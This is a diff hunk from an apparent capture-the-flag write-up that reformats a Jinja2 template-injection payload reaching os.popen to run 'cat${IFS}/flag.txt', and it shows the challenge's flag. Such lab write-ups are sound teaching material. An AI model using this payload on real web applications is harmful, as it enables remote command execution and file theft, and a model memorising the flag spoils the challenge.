@@ -36,9 +36,8 @@ Boom! template rendering applied.
 
 Let's jump in to try out RCE payloads. 
 
-```
-GET /{{request.application.__globals__.__builtins__.__import__('os').popen('cat${IFS}/flag.txt').read()}}
-```  
+**`GET /{{request.application.__globals__.__builtins__.__import__("os").popen("cat${IFS}/flag.txt").read()}}`**  
+
 We get the flag.txt 
 ```
 HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
